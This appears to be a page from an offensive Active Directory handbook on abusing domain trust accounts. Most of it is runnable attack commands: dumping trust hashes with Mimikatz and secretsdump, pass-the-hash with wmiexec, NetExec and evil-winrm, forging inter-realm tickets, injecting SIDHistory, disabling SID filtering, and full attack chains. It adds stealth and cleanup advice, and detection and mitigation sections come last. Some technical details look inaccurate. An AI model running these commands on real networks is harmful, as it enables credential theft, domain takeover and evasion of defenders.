# Abusing Trust Account$ — Accessing Resources on a Trusted Domain from a Trusting Domain

## Overview

Trust accounts (`TRUST_DOMAIN_NAME$`) are Active Directory objects representing domain trust relationships. Each trust has a corresponding trust account object with an NTLM hash, stored in AD like machine accounts. These trust accounts can be extracted and used for **cross-domain authentication** — allowing an attacker who compromised Domain A to access resources in Domain B.

### Key Concepts

- Every domain trust has a trust account named `TRUST_DOMAIN_NAME$`
- Trust accounts are stored in the `System` container of the trusting domain
- Trust account hashes can be extracted via DCSync or lsadump
- Trust accounts can authenticate across the trust using NTLM and Kerberos
- Trust accounts bypass some restrictions that apply to regular user accounts

## Trust Account Fundamentals

### How Domain Trusts Create Trust Accounts

When a trust is established between Domain A and Domain B:

```
Domain A uses key:  TRUST_DOMAIN_B$  ← stored in Domain A's AD
Domain B uses key:  TRUST_DOMAIN_A$  ← stored in Domain B's AD
```

Each trust account has:
- SAM account name: `TRUST_DOMAIN_NAME$`
- NTLM hash derived from the trust password
- Automatic password management (updated every 30 days by default)
- Membership in the `Domain Users` group of its domain

### Trust Account Object Location

```
CN=TRUST_DOMAIN_NAME$,CN=System,DC=domain,DC=local
```

### Trust Types and Account Usage

| Trust Type | Account Name | Direction | Authentication |
|------------|-------------|-----------|----------------|
| Parent-Child | CHILD$ | Bidirectional | Full |
| Tree | TREE$ | Bidirectional | Full |
| Forest | FOREIGN_FOREST$ | Bidirectional | Limited (SID filtering) |
| External | EXTERNAL$ | Configurable | Limited |
| Realm | REALM$ | Configurable | Limited |

## Extracting Trust Account Hashes

### Using Mimikatz lsadump

```mimikatz
# On a Domain Controller in the compromised domain
privilege::debug

# Dump all trust information from LSA
lsadump::trust /patch

# Dump specific trust information
lsadump::trust /patch /domain:target.domain.local

# Dump trust account from LSA secrets
lsadump::lsa /patch
```

Mimikatz trust output example:
```
[ 00000000] CHILD.DOM.LOCAL
   * ...
   
[ 00000001] ROOT.DOM.LOCAL
   * 3 / 3 records
   [ 0] C: ROOT.DOM.LOCAL        $ROOT.TIMESTAMP
   [ 1] C: ROOT.DOM.LOCAL        $ROOT.IN
   [ 2] C: ROOT.DOM.LOCAL        $ROOT.OUT
   * NTLM: aaaaabbbbbbccccccddddddeeeeeeee
   *  RID : 00000171 (369)
```

### Using DCSync

```mimikatz
# DCSync the trust account directly
lsadump::dcsync /domain:domain.local /user:TRUST_DOMAIN$
```

```bash
# Using secretsdump
python3 secretsdump.py "domain.local/Administrator:Password123!"@DC.domain.local -just-dc-user 'TRUST_DOMAIN$'

# Dump all accounts including trust accounts
python3 secretsdump.py "domain.local/Administrator:Password123!"@DC.domain.local -just-dc-ntlm
```

### Using Impacket secretsdump

```bash
# Extract all secrets including trust accounts
python3 secretsdump.py "domain.local/Administrator:Password123!"@DC.domain.local

# Extract trust account specifically (filter output)
python3 secretsdump.py "domain.local/Administrator:Password123!"@DC.domain.local | grep '\$\$'

# Using -just-dc flag
python3 secretsdump.py "domain.local/Administrator:Password123!"@DC.domain.local -just-dc
```

### Example Output

```
ROOT$:1106:aad3b435b51404eeaad3b435b51404ee:NTLM_HASH:::
ROOT$:1106:aad3b435b51404eeaad3b435b51404ee:NTLM_HASH:::
```

The trust account appears as `ROOT$` with its associated NTLM hash.

## Pass-the-Hash with Trust Accounts

### Using Impacket wmiexec.py

```bash
# PtH using the trust account NTLM hash
python3 wmiexec.py -hashes :NTLM_HASH 'domain.local/ROOT\$@target.tru.sted.com'

# With both LM:NTLM
python3 wmiexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:NTLM_HASH' 'domain.local/ROOT\$@target.tru.sted.com'
```

### Using NetExec (nxc)

```bash
# Check if trust account can authenticate
nxc smb target.tru.sted.com -u 'ROOT$' -H NTLM_HASH -d domain.local

# Execute command on target
nxc smb target.tru.sted.com -u 'ROOT$' -H NTLM_HASH -d domain.local -x "whoami"

# Check local admin access
nxc smb target.tru.sted.com -u 'ROOT$' -H NTLM_HASH -d domain.local --local-auth
```

### Using secretsdump

```bash
# Use trust account to dump hashes from the trusted domain
python3 secretsdump.py -hashes :NTLM_HASH 'domain.local/ROOT\$@DC.target.tru.sted.com'

# The trust account must have appropriate permissions on the target
```

### Using evil-winrm

```bash
# WinRM with trust account
evil-winrm -i target.tru.sted.com -u 'ROOT$' -H NTLM_HASH -d domain.local
```

**Note**: WinRM may reject trust accounts depending on GPO configuration.

## SIDHistory Abuse with Trust Accounts

SIDHistory allows a principal from one domain to be a member of SIDs from another domain. With a trust account, you can:

1. Authenticate as the trust account in the target domain
2. The trust account's authentication includes any SIDs in SIDHistory
3. If SID filtering is disabled, these SIDs grant access to resources

```powershell
# Adding SIDHistory to a trust account (requires elevated privileges)
# WARNING: Highly detectable and may break the trust
Set-ADObject -Identity "CN=ROOT$,CN=System,DC=domain,DC=local" -Add @{sidHistory="S-1-5-21-TARGET-519"}
```

### Cross-Domain SIDHistory

If SIDHistory is enabled and SID filtering is disabled, a user in Domain A with SIDHistory containing Domain Admins of Domain B will have admin access in Domain B:

```
User in Domain A
  └── SIDHistory: S-1-5-21-DOMAIN_B-512 (Domain Admins of Domain B)
  └── When authenticating to Domain B, the SID is honored
  └── User has Domain Admin privileges in Domain B
```

## Inter-Realm TGT Forging with Trust Keys

Trust keys can be used to forge inter-realm TGTs (referral tickets) that allow authentication across domain trusts.

### Extracting Trust Keys

```mimikatz
# Extract trust keys (RC4 and AES)
lsadump::trust /patch

# Extract only the trust key for a specific trust
lsadump::trust /patch /domain:target.domain.local
```

### Forging Inter-Realm TGT with Mimikatz

```mimikatz
# Forge an inter-realm TGT using the trust key
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-ORIGIN /sids:S-1-5-21-TARGET-519 /rc4:TRUST_KEY_HASH /target:target.domain.local /service:krbtgt /ptt
```

### Forging Inter-Realm TGT with ticketer.py

```bash
# Using trust key instead of krbtgt hash
python3 ticketer.py -nthash TRUST_NTLM_HASH -domain-sid S-1-5-21-ORIGIN -domain domain.local -extra-sid S-1-5-21-TARGET-519 -target-domain target.domain.local Administrator

# With trust key
python3 ticketer.py -aesKey AES_TRUST_KEY -domain-sid S-1-5-21-ORIGIN -domain domain.local -extra-sid S-1-5-21-TARGET-519 Administrator

# Use the forged ticket
export KRB5CCNAME=Administrator.ccache
python3 secretsdump.py -k -no-pass "target.domain.local/Administrator@DC.target.domain.local"
```

### Trust Key vs krbtgt Key

| Key | Source | Scope | SID Filtering |
|-----|--------|-------|:-------------:|
| Trust Key | Trust account hash | Inter-realm TGT only | Bypassed? |
| krbtgt Key | krbtgt account | Full domain TGT | Depend on trust |

The trust key can forge inter-realm TGTs that will be accepted by the trusted domain's KDC. However, SID filtering still applies for inter-forest trusts.

## Complete Attack Chains

### Scenario 1: Parent-Child Trust Abuse

```bash
# 1. Compromise child domain and extract trust account hash
python3 secretsdump.py "child.dom.local/Administrator:Pass123!"@DC.child.dom.local | grep -i "ROOT\\$"
# ROOT$:1106:aad3b435b51404eeaad3b435b51404ee:NTLM_HASH:::

# 2. Use trust account to authenticate to parent domain
python3 wmiexec.py -hashes :NTLM_HASH 'child.dom.local/ROOT$@DC.root.dom.local'

# 3. Once on the parent DC, extract all credentials
python3 secretsdump.py -hashes :NTLM_HASH 'child.dom.local/ROOT$@DC.root.dom.local' -just-dc-ntlm
```

### Scenario 2: Forest Trust Abuse (No SID Filtering)

```bash
# 1. Compromise Forest A, find trust to Forest B
Get-DomainTrust | Where-Object {$_.TrustType -eq "Forest"}

# 2. Extract trust account hash for Forest B
python3 secretsdump.py "forestA.local/Administrator:Pass123!"@DC.forestA.local | grep -i "FORESTB\\$"
# FORESTB$:1106:aad3b435b51404eeaad3b435b51404ee:HASH:::

# 3. If SID filtering is disabled, forge inter-realm TGT
python3 ticketer.py -nthash HASH -domain-sid S-1-5-21-FOREST_A -domain forestA.local -extra-sid S-1-5-21-FOREST_B-519 Administrator

# 4. Access Forest B resources
export KRB5CCNAME=Administrator.ccache
python3 secretsdump.py -k -no-pass "forestB.local/Administrator@DC.forestB.local"
```

### Scenario 3: Trust Account → Resource Access

```bash
# 1. Extract trust account hash
python3 secretsdump.py "domainA.local/Administrator:Pass123!"@DC.domainA.local -just-dc-user 'DomainB$'

# 2. Enumerate what the trust account can access
nxc smb server.domainB.local -u 'DomainB$' -H HASH -d domainA.local

# 3. Access file shares
nxc smb server.domainB.local -u 'DomainB$' -H HASH -d domainA.local --shares

# 4. Access specific resource
net use z: \\server.domainB.local\share /user:domainA.local\DomainB$ HASH
```

## Extraction from Mimikatz in Detail

### lsadump::trust /patch

```mimikatz
privilege::debug
lsadump::trust /patch
```

Full output example:
```
Primary Domain is:  CHILD.DOM.LOCAL
Current:  CHILD.DOM.LOCAL

Trust:  ROOT.DOM.LOCAL
  [ 00000000] C: ROOT.DOM.LOCAL        $ROOT.TIMESTAMP
  [ 00000001] C: ROOT.DOM.LOCAL        $ROOT.IN
  [ 00000002] C: ROOT.DOM.LOCAL        $ROOT.OUT
  * NT Hash: aaaaabbbbbbccccccddddddeeeeeeee
  * RC4-HMAC: aaaaabbbbbbccccccddddddeeeeeeee
  * AES128: 1111112222223333334444445555556666667777888899990000aaaabbbb
  * AES256: abcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcd

Trust:  OTHER.CHILD.DOM.LOCAL
  ...
```

### Extracting Specific Trust Keys

```mimikatz
# Dump only the OUT trust key (used for outgoing authentication)
lsadump::trust /patch /domain:root.dom.local
```

## Using Secretsdump for Trust Account Extraction

```bash
# Full extraction including trust accounts
python3 secretsdump.py "domain.local/Administrator:Password123!"@DC.domain.local

# Filter trust accounts from output
python3 secretsdump.py "domain.local/Administrator:Password123!"@DC.domain.local | grep '\$$'

# Just trust account information
python3 secretsdump.py "domain.local/Administrator:Password123!"@DC.domain.local -just-dc | grep "TRUST"

# JSON output for parsing
python3 secretsdump.py "domain.local/Administrator:Password123!"@DC.domain.local -just-dc-ntlm -outputfile dump
cat dump.ntds | grep '\$'
```

## OPSEC Considerations

### Trust Account Password Rotation

Like machine accounts, trust account passwords change automatically:
```
Default change interval: 30 days
Controlled by: domain member configuration
```

- The trust account hash is time-limited
- Plan operations to use the hash within the rotation window
- Consider extracting the trust key (krbtgt-like) instead of the NTLM hash for longer persistence

### Detection of Trust Account Usage

- Trust accounts authenticating from unusual source IPs
- Trust accounts used for interactive logon (anomalous)
- Multiple trust account authentications in rapid succession
- Cross-domain authentication with unusual service tickets

### Stealth Considerations

- Trust account usage generates inter-realm Kerberos traffic
- Use native Windows tools when possible to blend in
- Consider using the trust account's TGT instead of raw NTLM
- Clean up any added SIDHistory after use

## Detection

### Event ID 4768 — Kerberos TGT Request (Inter-Realm)

When a trust account requests a TGT:

```
A Kerberos authentication ticket (TGT) was requested.
  Account Name: DOMAINB$@domainA.local
  Service Name: krbtgt/DOMAINB.LOCAL
  Transited Services: -
  Ticket Encryption Type: 0x17 (RC4-HMAC)
  Ticket Options: 0x40810010
```

Indicators:
- Trust account requesting TGT for cross-domain services
- Inter-realm TGT requests with unusual encryption type
- Trust account originating from unexpected network location

### Event ID 4662 — Directory Service Access (Trust Extraction)

When trust account hashes are extracted:

```
An operation was performed on an object.
  Object: CN=ROOT$,CN=System,DC=domain,DC=local
  Access: DS-Replication-Get-Changes
  Access Mask: 0x100
```

### Event ID 4624 — Account Logon (Trust Account)

```
An account was successfully logged on.
  Account Name: DOMAINB$
  Account Domain: DOMAIN A
  Logon Type: 3 (Network)
  Process: C:\Windows\System32\svchost.exe
```

### PowerShell Detection

```powershell
# Check for recently modified trust account objects
Get-ADObject -Filter {ObjectClass -eq "trustedDomain"} -Properties Name, Modified

# Search for trust accounts with SIDHistory
Get-ADObject -LDAPFilter "(&(samAccountType=805306369)(name=*$)(sidHistory=*))" -Properties sidHistory

# Monitor for trust account authentication
Get-WinEvent -FilterHashtable @{LogName="Security"; ID=4768} |
    Where-Object { $_.Properties[0].Value -match "\$$" }
```

## SID Filtering and How to Bypass It

### SID Filtering Behavior

| Trust Type | SID Filtering | SIDHistory Honored | ExtraSids |
|------------|:--------------:|:------------------:|:---------:|
| Parent-Child | Disabled | Yes | Works |
| Tree | Disabled | Yes | Works |
| Forest | Enabled | No | Blocked |
| External | Enabled | No | Blocked |
| Realm | Enabled | No | Blocked |

### Bypassing SID Filtering

#### Method 1: Disable SID Filtering

If you have admin access on the trusted domain:

```powershell
# Disable SID filtering on the trust
netdom trust domainA.local /domain:domainB.local /quarantine:No

# Verify SID filtering status
netdom trust domainA.local /domain:domainB.local /verbose
```

#### Method 2: Modify Trust Attributes

```powershell
# Check trust attributes
Get-DomainTrust | Where-Object {$_.TargetName -eq "domainB.local"} |
    Select TrustAttributes

# Trust attributes that bypass SID filtering:
# 0x1 = FILTER_SIDS (default for forest trusts)
# 0x4 = TREAT_AS_EXTERNAL
# 0x8 = TRUST_USES_RC4
```

#### Method 3: SIDHistory Injection

```powershell
# If GenericWrite on the trust account, add SIDHistory
Set-ADObject -Identity "CN=DOMAINB$,CN=System,DC=domainA,DC=local" -Add @{sidHistory="S-1-5-21-DOMAINB-519"}
```

**Warning**: Modifying trust properties or SID filtering is highly detectable and may break the trust relationship.

### Detection of SID Filtering Bypass

- Event ID 4768 with unexpected SID counts
- Event ID 5136 — Trust object attribute modification
- Event ID 4732 — SIDHistory added to a principal
- Trust attributes changed from default values

## Mitigations

| Mitigation | Description | Impact |
|------------|-------------|--------|
| Enable SID Filtering | Ensure forest trusts have SID filtering enabled | Blocks SIDHistory attacks |
| Monitor Trust Account Usage | Alert on unusual trust account authentication | Detection |
| Audit Trust Relationships | Regularly review trust configurations | Prevention |
| Limit Trust Scope | Use selective authentication for trusts | Reduces attack surface |
| Protected Users Group | Add sensitive accounts to Protected Users | Limits delegation |

### Selective Authentication

```powershell
# Configure selective authentication for a trust
netdom trust domainA.local /domain:domainB.local /SelectiveAuth:Yes

# This requires explicit permission assignment for each resource
# Users must be individually authorized to access resources across the trust
```

### Trust Audit Commands

```cmd
# Check all trust relationships
nltest /domain_trusts /all_trusts

# Check trust with specific domain
nltest /server:DC.domainA.local /trusted_domains
```

## Cross-References

- [Enterprise Admin Cross-Forest Attack](../06_Kerberos_Attacks/08_Enterprise_Admin_Cross_Forest.md)
- [Forest Trust Abuse](../11_Attack_Scenarios/02_Forest_Trust_Abuse.md)
- [Cross-Forest Attack](../11_Attack_Scenarios/03_Cross_Forest_Attack.md)
- [Pass the Hash with Machine Accounts](../04_Lateral_Movement/12_Pass_The_Hash_Machine_Accounts.md)
- [Tools Reference - Mimikatz](../09_Tools_Reference/README.md)
- [Tools Reference - Impacket](../09_Tools_Reference/README.md)
